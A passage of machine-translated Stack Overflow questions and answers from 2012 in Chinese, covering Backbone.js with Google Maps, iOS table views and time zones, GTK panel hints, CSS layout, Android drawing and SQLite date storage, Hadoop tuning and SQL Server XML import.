由于您是 MVC 的新手，还需要考虑的一件事是，您可以轻松地使用可以在网上找到的大多数 css 主题，以使网站看起来非常不同。

# google-maps-api-3 - 带有主干的Google Maps API，如何绑定事件

> ID：11806196
> 
> 赞同：1
> 
> 时间：2012-08-04T05:32:53.173
> 
> 标签：google-maps-api-3, backbone.js, underscore.js

我已经看过其他几篇关于此的帖子，但这些回复的答案对我不起作用。

其他回应：

[如何绑定谷歌地图 geocoder.geocode() 回调函数](https://stackoverflow.com/questions/10516561/how-do-i-bind-a-google-maps-geocoder-geocode-callback-function)

[Backbone.js 和谷歌地图——这个和听众的问题](https://stackoverflow.com/questions/4379303/backbone-js-with-google-maps-problems-with-this-and-listeners)

我的代码：

```
var ns = namespace('camelcase.geomanager.map');

ns.Site = Backbone.Model.extend({
    url: '/site'
});

ns.Sites = Backbone.Collection.extend({
    model: ns.Site
});

ns.MapView = Backbone.View.extend({

    initialize: function() {
        this.markers = new Array();

        // Create the Google Map
        var mapOptions = {
                center: new google.maps.LatLng(-34.397, 150.644),
                zoom: 8,
                mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        this.googleMap = new google.maps.Map(this.$(".mapCanvas")[0], mapOptions);

        // Register events
        this.collection.on('add', this.addSite, this);
        this.collection.on('remove', this.removeSite, this);
    },

    addSite: function(model) {
    // Get model attributes
    var elementId = model.get('elementId');
    var latitude = model.get('latitude');
    var longitude = model.get('longitude');
    var id = model.get('id');
    var notes = model.get('notes');
    var title = ""+id;

    // Create icon and marker
    var icon = '/resources/img/elements/' + elementId + '_marker.png';
    var latLng = new google.maps.LatLng(latitude, longitude);
    var marker = new google.maps.Marker({
        position: latLng,
        title: title,
        map: this.googleMap,
        icon: icon
    });

    // Load info window
    var siteBubbleTemplate = _.template($('#siteBubbleTemplate').html());
    var siteContent = $(siteBubbleTemplate({
        siteId: id,
        siteNotes: notes
    }))[0];

    var infoWindow = new google.maps.InfoWindow({
        content: siteContent
    });

    // Show info window when clicking on marker
    _.bindAll(this, this.openSite);
    google.maps.event.addListener(marker, 'click', this.openSite(id));

        this.markers.push({
            id: id,
            marker: marker,
            infoWindow: infoWindow
        });

    },

    openSite: function(id) {
        var marker;
        for (var c=0; c<this.markers.length; c++) {
            marker = this.markers[c];

            // Open the appropriate marker info window
            if (marker.id == id) {
                marker.infoWindow.open(googleMap, marker.marker);
            }

            // Close the rest
            else {
                marker.infoWindow.close();
            }
        }
    }
}); 
```

违规行：

```
google.maps.event.addListener(marker, 'click', this.openSite(id)); 
```

firebug 中报告的错误：

> 类型错误：函数未定义
> 
> underscore.js（第 482 行）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T05:37:18.857

我怀疑 this.marker 是问题所在，因为您应该可以只按名称引用它。

```
google.maps.event.addListener(marker, 'click', this.openSite(id)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:09:58.633

看起来这是一个范围界定问题。我用以下代码解决了我的问题：

```
// Show info window when clicking on marker
_.bindAll(this);
var _self = this;
var doSomething = function(event) {
    _self.openSite({
        event: event
    });
};
google.maps.event.addListener(marker, 'click', doSomething); 
```

谁能最好地解释为什么会这样，我会给出答案。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-09T21:57:00.190

在模型/集合事件处理程序中，Backbone 将“this”设置为引发事件的模型/集合。如果您在视图的 initialize() 中调用 _.bindAll(this)，则“this”将被设置为事件处理程序中的视图。看看这个 jsfiddle： http: [//jsfiddle.net/9cvVv/339/](http://jsfiddle.net/9cvVv/339/)看看当你取消注释时会发生什么 _.bindAll(this);

```
var MyView = Backbone.View.extend({
    initialize: function() {
        // TODO: uncomment this line
        // _.bindAll(this);
        this.collection.bind('myEvent', this.onDoSomething);
    },

    updateCollection: function() {
        this.collection.doSomething();
    },

    onDoSomething: function() {
        if (this.models && typeof this.models.length === 'number') {
            alert('"this" is a collection.');
        }
        else if (this.collection) {
            alert('"this" is the view.');
        }
        else {
            alert('"this" is something else.');
        }
    }
}); 
```

# ios - 表视图部分

> ID：11806202
> 
> 赞同：-1
> 
> 时间：2012-08-04T05:33:41.877
> 
> 标签：ios, uitableview

我想设计一个有 2 个部分的动态表，第一个部分有 4 个单元格，第二个有 41 个单元格。我想分别对这两个部分进行编程，但我只能修改一个部分。如何分别修改每个部分。到目前为止我写的代码是这样的：

```
{
    - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {

        return 2;
    }

    - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {

        if (section == 0)
            return 4;
        else
            return 41;
    }

    - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
    {
        static NSString *CellIdentifier = @"Questions";
        UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
        if(cell == nil) cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"Questions"];

        cell.textLabel.text = [NSString stringWithFormat:@"Question %lu", (unsigned long)indexPath.row +1];

        return cell;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:17:56.507

NSIndexPath 有一个 row 属性和一个 section 属性。从这两个属性中，您可以知道您当前正在哪个单元格中工作

*   `<(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath`

例如：

```
(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

    static NSString *CellIdentifier = @"Questions";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if(cell == nil)
         cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:@"Questions"];

        if (indexPath.section == 0)
        {
            cell.textLabel.text = [NSString stringWithFormat:@"1st Group - Question %d", indexPath.row + 1];
        }
        else
        {
            cell.textLabel.text = [NSString stringWithFormat:@"2nd Group - Question %d", indexPath.row + 1];
        }

        return cell;
    } 
```

# gtk - 如何让顶层像面板一样执行？

> ID：11806203
> 
> 赞同：2
> 
> 时间：2012-08-04T05:33:42.907
> 
> 标签：gtk, panel, x11

我正在编写一个小程序，它需要像面板一样执行。现在我有一个问题。如果窗口最大化，Windows 仍将取代它。（其实是背后）

我的顶层窗口变成了一个“永远在最上面”的窗口。我用了

```
gtk_window_set_type_hint(GTK_WINDOW (self), GDK_WINDOW_TYPE_HINT_DOCK); 
```

但是这个问题仍然困扰着我。

有任何想法吗？谢谢。

PS：我的程序是用 GTK+ 编写的，在 X11 上运行。

* * *

现在这个问题已经用下面的代码解决了，

```
void
hs_x_set_hint_strut (GdkWindow *window,
                     int        left,
                     int        right,
                     int        top,
                     int        bottom)
{
    GdkAtom atom;

    long vals[4];
    vals[0] = left;
    vals[1] = right;
    vals[2] = top;
    vals[3] = bottom;

    atom = gdk_atom_intern ("_NET_WM_STRUT", FALSE);

    gdk_property_change (window, atom, gdk_x11_xatom_to_atom (XA_CARDINAL), 
                         32, GDK_PROP_MODE_REPLACE, (guchar *)vals, 4);
}

void
hs_x_set_window_strut (GtkWindow *window)
{
    GdkWindow *gdk_win;
    GdkRectangle win_rect;

    g_return_if_fail (GTK_IS_WINDOW (window));
    gdk_win = gtk_widget_get_window (GTK_WIDGET (window));
    gdk_window_get_geometry (gdk_win, NULL, NULL, 
                             NULL, &win_rect.height);
    hs_x_set_hint_strut (gdk_win, 0, 0, win_rect.height, 0);
} 
```

感谢安德烈西多罗夫的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T22:46:45.823

您需要设置[_NET_WM_STRUT / _NET_WM_STRUT_PARTIAL](http://standards.freedesktop.org/wm-spec/wm-spec-1.3.html#NETWMSTRUT)提示

# css - 在调整 CSS 大小时更改 div 位置

> ID：11806205
> 
> 赞同：1
> 
> 时间：2012-08-04T05:34:06.557
> 
> 标签：css, html

在页面上有两个相邻的 div。现在，当我调整浏览器的大小时，其中一个 div 与另一个重叠。当没有足够的空间来显示两者时，我想要将其中一个 div 向下移动（在另一个 div 下方）。可以用css实现吗？如何？

身体：

```
<div id="container">
   <h1 align="center">Title</h1>

   <div id="image1">
        <img src="back1.png" alt="a" />
   </div>

   <div id="image2">
       <img src="back2.png" alt="b" />
   </div>
</div>​ 
```

CSS

```
#container {position: relative; height:800px; width: 720px; background: #f0f0f0;}        
#container #image1 {position: absolute;  top: 10%; left: 0;}​
#container #image2 {position: absolute;  top:0;  right:0;}​ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:05:51.513

尽管您尚未发布代码，但我猜您是通过使用相对或绝对定位来定位 div 来设置它们的样式，这会使它们重叠。相反，我会用`display:inline-block;`你想要的方式制作相邻的 div。

[单击此处](http://jsfiddle.net/WZKBm/)以获取我的意思的示例。尝试调整浏览器的大小以查看它是否有效。

[这个例子](http://jsfiddle.net/u7cKk/1/)更符合你的意思吗？我只用了花车。

# ios - InApp 不适用于 iOS 5.1.1

> ID：11806207
> 
> 赞同：0
> 
> 时间：2012-08-04T05:34:12.963
> 
> 标签：ios, in-app-purchase, itunes-store

我的应用程序有一个 inApp 购买，它适用于我的装有 iOS 5.0 的 ipad。

现在，在使用 iOS 5.1.1 进行测试时，相同的构建在应用内购买“无法连接到 iTunes Store”时出现错误。在调试时，我成功获得了产品列表，但是当我尝试购买该产品时出现错误......

```
SKPayment *payment = [SKPayment paymentWithProductIdentifier:productIdentifier]; 
```

是否有人在购买 inApp 时遇到此类错误？任何建议都会有很大帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T18:37:04.200

该解决方案对我有用：-

转到设置--->常规--->重置--->重置所有设置，它工作正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T11:02:14.787

You're using paymentWithProductIdentifier: which is deprecated in iOS 5.0, maybe that's the problem. Try using :paymentWithProduct: instead.

"paymentWithProductIdentifier: Returns a new payment with the specified product identifier. (Deprecated in iOS 5.0.)" [http://developer.apple.com/library/ios/documentation/StoreKit/Reference/StoreKit_Collection/StoreKit_Collection.pdf](http://developer.apple.com/library/ios/documentation/StoreKit/Reference/StoreKit_Collection/StoreKit_Collection.pdf)

# android - 关于Android Paint绘制颜色

> ID：11806208
> 
> 赞同：6
> 
> 时间：2012-08-04T05:34:16.837
> 
> 标签：android, draw, paint

绘图视图.java

```
public class DrawView extends View implements OnTouchListener {
private Canvas mCanvas;
private Path mPath;
public Paint mPaint;
ArrayList<Path> paths = new ArrayList<Path>();
private ArrayList<Path> undonePaths = new ArrayList<Path>();

private MaskFilter mEmboss;
private MaskFilter mBlur;

private Bitmap im;

public DrawView(Context context) {
    super(context);
    setFocusable(true);
    setFocusableInTouchMode(true);
    this.setOnTouchListener(this);

    paths.clear();
    undonePaths.clear();

    mPaint = new Paint();
    mPaint.setAntiAlias(true);
    mPaint.setDither(true);
    mPaint.setColor(Color.BLUE);
    mPaint.setStyle(Paint.Style.STROKE);
    mPaint.setStrokeJoin(Paint.Join.ROUND);
    mPaint.setStrokeCap(Paint.Cap.ROUND);
    mPaint.setStrokeWidth(4);
    mEmboss = new EmbossMaskFilter(new float[] { 1, 1, 1 }, 0.4f, 6, 3.5f);

    mBlur = new BlurMaskFilter(8, BlurMaskFilter.Blur.NORMAL);

    mCanvas = new Canvas();
    mPath = new Path();
    // paths.add(mPath);

    im = BitmapFactory.decodeResource(context.getResources(),
            R.drawable.ic_launcher);

}

@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {
    super.onSizeChanged(w, h, oldw, oldh);
}

@Override
protected void onDraw(Canvas canvas) {
    canvas.drawColor(Share.cColor);

    for (Path p : paths) {

        canvas.drawPath(p, mPaint);
    }

    canvas.drawPath(mPath, mPaint);

}

private float mX, mY;
private static final float TOUCH_TOLERANCE = 4;

private void touch_start(float x, float y) {

    mPaint.setColor(Share.dColor);
    undonePaths.clear();
    mPath.reset();
    mPath.moveTo(x, y);
    mX = x;
    mY = y;

    Log.e("", "pathsize:::" + paths.size());
    Log.e("", "undonepathsize:::" + undonePaths.size());
}

private void touch_move(float x, float y) {
    float dx = Math.abs(x - mX);
    float dy = Math.abs(y - mY);
    if (dx >= TOUCH_TOLERANCE || dy >= TOUCH_TOLERANCE) {
        mPath.quadTo(mX, mY, (x + mX) / 2, (y + mY) / 2);
        mX = x;
        mY = y;
    }
}

private void touch_up() {
    mPath.lineTo(mX, mY);
    // commit the path to our offscreen
    mCanvas.drawPath(mPath, mPaint);
    // kill this so we don't double draw
    paths.add(mPath);
    mPath = new Path();

    Log.e("", "pathsize:::" + paths.size());
    Log.e("", "undonepathsize:::" + undonePaths.size());
}

public void onClickUndo() {

    Log.e("", "pathsize:::" + paths.size());
    Log.e("", "undonepathsize:::" + undonePaths.size());
    if (paths.size() > 0) {
        undonePaths.add(paths.remove(paths.size() - 1));
        invalidate();
    } else {

    }
    // toast the user
}

public void onClickRedo() {

    Log.e("", "pathsize:::" + paths.size());
    Log.e("", "undonepathsize:::" + undonePaths.size());
    if (undonePaths.size() > 0) {
        paths.add(undonePaths.remove(undonePaths.size() - 1));
        invalidate();
    } else {

    }
    // toast the user
}

@Override
public boolean onTouch(View arg0, MotionEvent event) {
    float x = event.getX();
    float y = event.getY();

    switch (event.getAction()) {
    case MotionEvent.ACTION_DOWN:
        touch_start(x, y);
        invalidate();
        break;
    case MotionEvent.ACTION_MOVE:
        touch_move(x, y);
        invalidate();
        break;
    case MotionEvent.ACTION_UP:
        touch_up();
        invalidate();
        break;
    }
    return true;
} 
```

}

我正在尝试用不同的颜色绘制手指画，但是每当我改变颜料的颜色时，所有以前的路径或绘图都会获取并使用更新的颜色进行绘制，我想用不同的颜色进行绘制，我该怎么做？请给我一些解决方案。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-04T05:40:26.310

为此，您必须`Paint`为每个绘制的对象创建一个新对象。这是因为当重绘时，它每次都`Canvas`引用同一个对象，所以所有路径都将使用这个绘制。`Paint`

首先，我会将您的`paths`数组更改为同时包含 a`Paint`和 a `Path`。您可以使用 Android 类型来实现这一点`Pair`。

```
ArrayList<Pair<Path, Paint>> paths = new ArrayList<Pair<Path, Paint>>(); 
```

您还必须以`undonePaths`这种方式转换您的变量。

然后，在您的`touch_up()`方法中，您需要添加这个新`Paint`对象。

```
Paint newPaint = new Paint(mPaint); // Clones the mPaint object
paths.add(new Pair<Path, Paint>(mPath, newPaint)); 
```

最后，您的循环也必须为此进行调整：

```
for (Pair<Path, Paint> p : paths) {
    canvas.drawPath(p.first, p.second);
} 
```

这会占用大量内存，因此当这些项目不再使用时，您必须小心重置它们，但是要拥有这么多不同的颜色，您*必须*拥有所有这些不同的`Paint`对象。

# xml - 如何有效地将 XML 数据与 c#.net 4.0 中的关系一起插入到多个表中？

> ID：11806210
> 
> 赞同：0
> 
> 时间：2012-08-04T05:34:24.560
> 
> 标签：xml, sql-server-2008, c#-4.0

我有一个 XML 文件，其中几乎没有类似类型的节点。这些节点中的每一个都将有子节点。要求是我需要将主节点的数据插入到特定表中，并将其每个子表数据插入到特定子表中，并将外键设置为第一次插入的主键。XML 类似于以下示例，

```
 <XML>
          <Provider>
              <providerID>1</ProviderID>
              .
              .
              .
              <ContactInfo>
                 <Address>address1</Address>
                 .
                 .
              </ContactInfo>                  
          </Provider>
           <Provider>
              <providerID>2</ProviderID>
              .
              .
              .
              <ContactInfo>
                 <Address>Address2</Address>
                 .
                 .
              </ContactInfo>                 
          </Provider> 
```

确切的要求是我需要先将提供者数据插入 Table1，然后我需要将每个提供者中的 ContactInfo 与 Table1 的 PK 一起插入到 Table2 中，作为 Table2 的 FK，......

如何在 c#.net 中有效地实现这一点，避免复杂的循环？任何人都请帮我解决这个问题......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:45:16.340

```
Declare @xml xml
Set @xml = 
'<XML>
<Provider>
    <providerID>1</providerID>
    <ContactInfo>
        <Address>address1</Address>
    </ContactInfo>                  
</Provider>

<Provider>
    <providerID>2</providerID>
    <ContactInfo>
        <Address>address2</Address>
    </ContactInfo>                  
</Provider>

</XML>' 
```

* * *

```
Select 
X.T.value('(providerID)[1]', 'int'),
X.T.value('(ContactInfo/Address)[1]', 'varchar(100)')
From @xml.nodes('/XML/Provider') as X(T) 
```

* * *

好的。现在您已经获得了从 xml 中提取数据的查询。首先将所有这些记录插入到临时表中。

完成后，插入第一个表。完毕？现在插入连接记录（连接第一个表和临时表以从第一个表中获取主键值）。

最后，将第二个临时表插入到第二个表中。

# hadoop - 如何减少作业中的地图扫描次数（不改变数据块大小）？

> ID：11806213
> 
> 赞同：0
> 
> 时间：2012-08-04T05:34:50.770
> 
> 标签：hadoop

我的问题的要点是..如何减少一项工作可能需要的地图扫描次数？一个job的map任务数是data_size/HDFS_BLOCK_SIZE。完成此操作可能需要的扫描次数取决于我们拥有的地图槽数。假设我什么都不运行，只运行一个作业，我发现每个节点的 CPU 利用率很低（这意味着我实际上可以在每个节点上运行更多的映射作业）。我使用了 mapred.tasktracker.map.tasks.maximum 参数（例如，我的每个节点都有 32 个处理器，我将其设置为高达 30）——但我永远无法增加映射槽的数量和整体 CPU 利用率是60%左右。还有其他参数可以玩吗？我拥有的数据量足够大（32GB，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T03:29:24.950

对不起，我的安装一定有问题。我碰巧重新安装了hadoop，它按预期工作。我想某些参数一定是冲突的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T09:24:01.347

如果有人还没有告诉你：MapReduce 主要是 IO 绑定的，它必须从磁盘读取大量数据，将其写回，读取并再次写入。在读取和写入之间，它执行你的 map 和 reduce 逻辑。

所以我听说提高 CPU 使用率是使集群不再受 IO 限制

*   RAID-0 或 RAID-10 您的硬盘，获得最快的硬盘。在消费市场上，有 10k RPM 的西部数据 VelociRaptors。
*   SSD 的贡献不大，因为 Hadoop 主要针对顺序辐射进行了优化。
*   提供尽可能多的网络带宽。
*   大量用于磁盘缓存的 RAM。

即使这样，您也应该面临 <100% 的 CPU 使用率，但这要好得多，并且性能会飙升。

但是，正如您可能从以上几点得出的结论一样，CPU 利用率并不是 Hadoop 集群的一个好的指标。Hadoop 主要是关于数据的可靠存储，提供简洁的功能来处理它。没有给你超级计算机的性能，如果你需要这个得到一个 MPI 集群和一个 PH.D 来编码你的算法；）

# iphone - 在 iOS 中将 GMT 转换为 IST

> ID：11806215
> 
> 赞同：1
> 
> 时间：2012-08-04T05:35:12.500
> 
> 标签：iphone, objective-c, ios, xcode

如何在 IOS 中将 GMT 转换为 IST？我有代码，可以让我在 GMT 有时间。但我想将其转换为相应的本地时区并在我的应用程序中使用它。我怎样才能做到这一点 ？提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T12:07:14.313

下面的代码将 GMT 转换为 IST。

```
NSString *inDateStr = @"2000/01/02 03:04:05";
NSString *s = @"yyyy/MM/dd HH:mm:ss";

// about input date(GMT)
NSDateFormatter *inDateFormatter = [[NSDateFormatter alloc] init];
inDateFormatter.dateFormat = s;
inDateFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"GMT"];
NSDate *inDate = [inDateFormatter dateFromString:inDateStr];

// about output date(IST)
NSDateFormatter *outDateFormatter = [[NSDateFormatter alloc] init];
outDateFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"IST"];
outDateFormatter.dateFormat = s;
NSString *outDateStr = [outDateFormatter stringFromDate:inDate];

// final output
NSLog(@"[in]%@ -> [out]%@", inDateStr, outDateStr); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T11:09:56.230

```
[(NSDateFormatter *) setTimeZone:[NSTimeZone localTimeZone]]; this will give u the local conversion of the GMT to local time zone. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-06-09T14:42:05.993

我在下面的代码中使用了将 GMT 转换为 IST。

```
NSTimeZone *zone1=[NSTimeZone localTimeZone];
long second=[zone1 secondsFromGMT]; //offset
NSDate *currentdate=[NSDate date];

NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
[dateFormat setDateFormat:@"MMddyyyy hh:mm:ss"]; // format
[dateFormat setTimeZone:[NSTimeZone timeZoneForSecondsFromGMT:second]];

dateStr = [dateFormat stringFromDate:currentdate];
NSLog(@"Current date %@",dateStr); 
```

这可能会有所帮助。

谢谢

# android - 如何在移动设备上使用 Zepto 向上/向下滑动元素？

> ID：11806217
> 
> 赞同：1
> 
> 时间：2012-08-04T05:35:40.553
> 
> 标签：android, iphone, cordova, css-transitions, zepto

一个常见的移动 UI 模式是向上/向下滑动，例如向上滑动一个操作表，然后在它不在视图中时将其滑回屏幕下方。

我尝试了各种 css 3 过渡和 Zepto 的动画功能，但还没有找到在 Android 和 iPhone 上流畅且一致地运行的东西。

我认为这篇文章可以作为一个明确的问题和答案：

# **您如何在 Android 和 iPhone 浏览器（以及扩展名为 PhoneGap）上平滑向上/向下滑动？**

这是一个开始：

```
#action-sheet {
  background-color: #333;
  height: 200px; /* note that the height changes depending
                   on # of action divs added to the action picker,
                   dynamically from Javascript */
  width: 250px;
  position: fixed;
  bottom: -50%; /* something that will get it off the screen */
  left: 50%;
  margin-left: -125px;
  /* maybe some css3 transition here? */
}
#action-sheet.active {
   bottom: 0px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T18:58:00.360

iOS 和 Android 浏览器使用 webkit 渲染引擎，其中 3d 转换是硬件加速的，所以这就是您想要使用的。你应该使用 translate3d。

将活动类添加到#action-sheet 将在 2 秒内将其向下滑动 200px

```
#action-sheet {
  -webkit-transition: -webkit-transform 2s;
}
#action-sheet.active {
  -webkit-transform: translate3d(0,200px,0);
} 
```

# android - 按时间和日期存储、检索和排序记录

> ID：11806219
> 
> 赞同：0
> 
> 时间：2012-08-04T05:35:51.207
> 
> 标签：android, sqlite, android-datepicker

我想我可能在一篇文章中问的太多了，所以让我知道我是否应该将它分解为日期和时间的单独问题，但是在数据库中使用日期和时间让我完全难过。我研究了各种方法（字符串、juliandates、unix 等），它所做的一切让我更加困惑。为了提供一些上下文，用户通过填写​​表格来添加记录。该表单有 2 个按钮，一个使用日期选择器打开一个片段，一个使用时间选择器打开一个片段。所选日期和时间显示为按钮文本。另一个按钮将表单详细信息保存到数据库中。

接下来，我有一个显示当前所有记录的列表视图活动，但我最终希望有一个指向日期选择器片段的按钮，以便只显示具有特定日期的记录。然后按时间顺序列出这些记录。（我想一旦解决了下一段，我就可以自己弄清楚这一段。）

单击列表视图中的一条记录会打开一个与原始表单（创建记录的位置）具有相同外观的活动，并填充该记录中的所有信息。然后用户可以选择删除记录，或修改记录中的字段并保存（更新）记录。此表单还应包含一个日期和时间按钮，以便也可以更改这些按钮，因此应将选择器设置为此活动中先前保存的日期/时间。

我需要帮助的是存储日期和时间以便稍后在编辑表单中检索和编辑它的最佳方法，包括将其格式化为特定方法以显示为按钮文本（日期的 DD/MM/yyyy和 hh:mm:am/pm 时间）。如前所述，这让我感到很困惑，所以我真的很感激能有这样的手把手。为下面的大量编码道歉，但我试图通过删除所有额外的表单字段来保持它的相关性。

**FuncAdd.java（保存数据的表格）：**

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView (R.layout.dash_add);

    now = Calendar.getInstance();
    add_button_date = (Button) findViewById(R.id.add_button_date);
    add_button_time = (Button) findViewById(R.id.add_button_time);

    add_button_date.setText(String.valueOf(now.get(Calendar.DAY_OF_MONTH))+"/"+
            String.valueOf(now.get(Calendar.MONTH)+1)+"/"+
            String.valueOf(now.get(Calendar.YEAR)));
    strDate = add_button_date.getText().toString();

    add_button_time.setText(String.valueOf(now.get(Calendar.HOUR_OF_DAY))+":"+
            String.valueOf(now.get(Calendar.MINUTE)));
}

public void addDateTime(View v) {
    int id = v.getId();
    switch (id) {
    case R.id.add_button_date :
        showDialogDate();
        break;
    case R.id.add_button_time :
        showDialogTime();
        break;
    default:
        break;
}}

public interface DateDialogFragmentListener {
    public void updateChangedDate(int year, int month, int day);
}

public interface TimeDialogFragmentListener {
    public void updateChangedTime(int hourOfDay, int minute);
}

public void showDialogDate() {
    FragmentTransaction ftDate = getFragmentManager().beginTransaction();
    fragDate = DateDialogFragment.newInstance(this, new DateDialogFragmentListener() {
        public void updateChangedDate(int year, int month, int day) {
            add_button_date.setText(String.valueOf(day)+"/"+String.valueOf(month+1)+"/"+String.valueOf(year));
            now.set(Calendar.YEAR, year);
            now.set(Calendar.MONTH, month);
            now.set(Calendar.DAY_OF_MONTH, day);
        }}, now);
    fragDate.show(ftDate, "DateDialogFragment");
}

public void showDialogTime() {
    FragmentTransaction ftTime = getFragmentManager().beginTransaction();
    fragTime = TimeDialogFragment.newInstance(this, new TimeDialogFragmentListener() {
        public void updateChangedTime(int hourOfDay, int minute) {
            add_button_time.setText(String.valueOf(hourOfDay)+":"+String.valueOf(minute));
            now.set(Calendar.HOUR_OF_DAY, hourOfDay);
            now.set(Calendar.MINUTE, minute);
        }}, now);
    fragTime.show(ftTime, "TimeDialogFragment");
}

public void onClick(View arg0) {

    strDate = add_button_date.getText().toString();
    strTime = add_button_time.getText().toString();

    String Time = strTime;
    String Date = strDate;
AddDBHelper entry = new AddDBHelper(FuncAdd.this);
    entry.open();
    entry.createEntry(Time, Date, Category, CategoryPos, BGL, Carbs, Insulin, InsulinPos, Dose, CorInsulin, CorInsulinPos, CorDose);
    entry.close();              

    goHome (this);
} 
```

**AddDBHelper.java（我的数据库助手类）：**

```
private static class DbHelper extends SQLiteOpenHelper {

    public DbHelper(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE " + DB_TABLE + " (" +
            KEY_ROWID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
            KEY_TIME + " TEXT NOT NULL, " +
            KEY_DATE + " TEXT NOT NULL, " +
            KEY_CATEG + " TEXT NOT NULL);"
);}

public long createEntry(String Time, String Date, String Category) {
    ContentValues cv = new ContentValues();
    cv.put(KEY_TIME, Time);
    cv.put(KEY_DATE, Date);
    cv.put(KEY_CATEG, Category);
    return glucoDB.insert(DB_TABLE, null, cv);
}

public Cursor getEntries() {        
    return glucoDB.query(DB_TABLE, new String[] {
            KEY_ROWID,
            KEY_TIME,
            KEY_DATE,
            KEY_CATEG},
            null, null, null, null, null);
}

public void updateDetails(DBDetails dbdetails) {

    ContentValues cv = new ContentValues();
    cv.put(AddDBHelper.KEY_TIME, UpdateDBDetails.newTime);
    cv.put(AddDBHelper.KEY_DATE, UpdateDBDetails.newDate);
    cv.put(AddDBHelper.KEY_CATEG, dbdetails.getuCateg());

    int count = glucoDB.update(DB_TABLE, cv, KEY_ROWID + "=?", new String[] {String.valueOf(dbdetails.getuRow())});
    Log.v("AddDbHelper", "Row " + dbdetails.getuRow() + " updated? " + count);
} 
```

* *TimeDialogFragment 类：**

```
public class TimeDialogFragment extends DialogFragment {

static Context mContext;
static int mHour;
static int mMinute;
static TimeDialogFragmentListener mListener;

public static TimeDialogFragment newInstance(Context context,
        TimeDialogFragmentListener listener, Calendar now) {
    TimeDialogFragment dialog = new TimeDialogFragment();
    mContext = context;
    mListener = listener;

    mHour = now.get(Calendar.HOUR_OF_DAY);
    mMinute = now.get(Calendar.MINUTE);

    Bundle args = new Bundle();
    args.putString("title", "Set Time");
    dialog.setArguments(args);
    return dialog;
}

public Dialog onCreateDialog(Bundle savedInstanceState) {
    return new TimePickerDialog(mContext, mTimeSetListener, mHour, mMinute, false);
}

private TimePickerDialog.OnTimeSetListener mTimeSetListener =
        new TimePickerDialog.OnTimeSetListener() {

    public void onTimeSet(TimePicker view, int hourOfDay, int minute) {
        mHour = hourOfDay;
        mMinute = minute;
        mListener.updateChangedTime(hourOfDay, minute);
    }
}; } 
```

**DateDialogFragment 类：**

```
public class DateDialogFragment extends DialogFragment {

static Context mContext;
static int mYear;
static int mMonth;
static int mDay;
static DateDialogFragmentListener mListener;

public static DateDialogFragment newInstance(Context context,
        DateDialogFragmentListener listener, Calendar now) {
    DateDialogFragment dialog = new DateDialogFragment();
    mContext = context;
    mListener = listener;

    mYear = now.get(Calendar.YEAR);
    mMonth = now.get(Calendar.MONTH);
    mDay = now.get(Calendar.DAY_OF_MONTH);

    Bundle args = new Bundle();
    args.putString("title", "Set Date");
    dialog.setArguments(args);
    return dialog;          
}

public Dialog onCreateDialog(Bundle savedInstanceState) {
    return new DatePickerDialog(mContext, mDateSetListener,
            mYear, mMonth, mDay);
}

private DatePickerDialog.OnDateSetListener mDateSetListener = 
        new DatePickerDialog.OnDateSetListener() {

    public void onDateSet(DatePicker view, int year, int monthOfYear,
            int dayOfMonth) {
        mYear = year;
        mMonth = monthOfYear;
        mDay = dayOfMonth;
        mListener.updateChangedDate(year, monthOfYear, dayOfMonth);     
            }
    };} 
```

**DBDetails.java（获取/设置值的类）：**

```
public class DBDetails {

private String uRow;
private String uTime;
private String uDate;
private String uCateg;

public String getuRow() {
    return uRow;
}

public void setuRow(String uRow) {
    this.uRow = uRow;
}

public String getuTime() {
    return uTime;
}

public void setuTime(String uTime) {
    this.uTime = uTime;
}

public String getuDate() {
    return uDate;
}

public void setuDate(String uDate) {
    this.uDate = uDate;
}

public String getuCateg() {
    return uCateg;
}

public void setuCateg(String uCateg) {
    this.uCateg = uCateg;
} } 
```

**UpdateDBDetails.java（用户可以编辑记录的类）：**

```
public class UpdateDBDetails extends DashMenuActivity {

TimeDialogFragment fraguTime;
DateDialogFragment fraguDate;
Button update_button_time, update_button_date;
Calendar now;

ImageButton update_button_save, update_button_delete;   
String strTime, strDate;

private String bundleduRowId;
